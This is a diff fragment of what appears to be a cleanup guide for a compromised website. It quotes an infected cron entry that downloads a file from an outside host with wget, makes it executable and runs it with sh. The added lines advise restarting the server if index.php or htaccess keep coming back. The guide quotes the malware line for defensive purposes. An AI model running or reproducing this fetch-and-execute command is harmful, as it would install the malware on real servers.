@@ -53,3 +53,6 @@ And also check cronjobs (/var/spool/cron/username) for be like this infected lin
 
 * * * * * wget -q -O xxxd http://hello.hahaha666.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home//username/public_html 24 && rm -f xxxd
 This code create a ./css/index.php file and can be deleted.
+
+# After All still you website is regenerating index.php or htaccess 
+You need to restart your server or Kill all the process that are running for your server
